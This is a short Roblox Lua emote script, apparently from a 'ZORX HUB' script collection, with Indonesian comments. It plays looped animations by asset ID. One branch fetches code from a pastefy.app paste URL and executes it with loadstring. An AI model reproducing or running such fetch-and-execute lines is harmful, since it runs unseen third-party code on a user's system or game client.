-- [[ ZORX HUB UNIVERSAL - SUPREME EMOTE REPLICATION ]] --
local args = {...}
local emoteName = args[1]
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Fungsi untuk memutar animasi agar terlihat semua orang (Global)
local function playGlobal(id)
    -- Menghentikan semua animasi yang sedang berjalan agar tidak bertabrakan
    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
        track:Stop()
    end

    -- Membuat objek animasi baru
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. id
    
    -- Memasukkan animasi ke humanoid dan menyetel prioritas tertinggi
    local track = humanoid:LoadAnimation(anim)
    track.Priority = Enum.AnimationPriority.Action 
    track.Looped = true
    track:Play()
end

-- LOGIKA PEMILIHAN EMOTE
if emoteName == "NeedyShake" then
    playGlobal("18043914845") -- ID Needy Shake (R15)
elseif emoteName == "TripOut" then
    playGlobal("11352467571") -- ID Trip Out (R15)
elseif emoteName == "Spider" then
    loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
elseif emoteName == "Stop" then
    -- Menghentikan semua emote jika dipanggil ("Stop")
    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
        track:Stop()
    end
end
